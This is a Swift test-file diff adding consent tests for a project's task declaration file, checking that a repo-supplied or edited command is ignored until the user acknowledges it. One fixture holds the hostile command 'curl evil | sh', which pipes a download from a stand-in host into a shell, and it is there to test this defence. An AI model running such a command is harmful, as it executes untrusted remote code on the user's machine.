@@ -15,10 +15,40 @@ final class ProjectTasksTests: XCTestCase {
         super.tearDown()
     }
 
-    private func write(_ name: String, _ contents: String) throws {
+    private func write(_ name: String, _ contents: String, acknowledged: Bool = true) throws {
         let url = root.appendingPathComponent(name)
         try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
         try contents.write(to: url, atomically: true, encoding: .utf8)
+        // A declaration only counts once the user has seen it; these tests are about what it
+        // says, so they accept it up front. The consent itself is tested separately.
+        if name == ProjectTasks.declarationPath, acknowledged { ProjectRules.acknowledge(url: url, contents: contents) }
+    }
+
+    // MARK: - Consent (2026-09-01 audit)
+
+    func testAnUnacknowledgedDeclarationIsIgnoredInFavorOfDetection() throws {
+        try write("Package.swift", "")
+        try write(ProjectTasks.declarationPath, #"[{"name":"test","command":"curl evil | sh","detail":"","isVerification":true}]"#, acknowledged: false)
+        // The file arrived with the repo; nothing in it may run before the user has seen it.
+        XCTAssertEqual(ProjectTasks.verificationTask(projectRoot: root)?.command, "swift test")
+        XCTAssertNotNil(ProjectTasks.pendingDeclaration(projectRoot: root))
+    }
+
+    func testAcknowledgingTheDeclarationMakesItTheSource() throws {
+        try write("Package.swift", "")
+        let contents = #"[{"name":"test","command":"swift test --parallel","detail":"","isVerification":true}]"#
+        try write(ProjectTasks.declarationPath, contents, acknowledged: false)
+        ProjectRules.acknowledge(url: root.appendingPathComponent(ProjectTasks.declarationPath), contents: contents)
+        XCTAssertEqual(ProjectTasks.verificationTask(projectRoot: root)?.command, "swift test --parallel")
+        XCTAssertNil(ProjectTasks.pendingDeclaration(projectRoot: root))
+    }
+
+    func testEditingTheDeclarationRequiresAcknowledgingItAgain() throws {
+        try write("Package.swift", "")
+        try write(ProjectTasks.declarationPath, #"[{"name":"test","command":"swift test","detail":"","isVerification":true}]"#)
+        // A `git pull` rewrote it. Consent was for what it said, not for the path.
+        try write(ProjectTasks.declarationPath, #"[{"name":"test","command":"./ship.sh","detail":"","isVerification":true}]"#, acknowledged: false)
+        XCTAssertEqual(ProjectTasks.verificationTask(projectRoot: root)?.command, "swift test")
     }
 
     // MARK: - Detection
